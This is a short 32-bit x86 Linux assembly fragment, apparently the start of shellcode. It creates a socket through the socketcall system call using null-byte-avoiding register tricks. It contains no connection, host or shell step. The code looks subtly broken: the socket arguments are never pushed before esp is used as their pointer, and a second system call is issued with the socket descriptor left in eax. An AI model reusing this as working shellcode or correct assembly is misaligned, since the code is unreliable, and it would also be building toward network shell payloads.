section .text
        global _start

_start:

        ;; socket()
        xor eax,eax
        mov ecx,esp             ;socket_args

        xor ebx,ebx
        inc ebx                 ;SYS_SOCKET

        mov al,0x66             ;SYS_SOCKETCALL

        int 0x80

        mov esi,eax             ;save sockfd in esi

        int 0x80
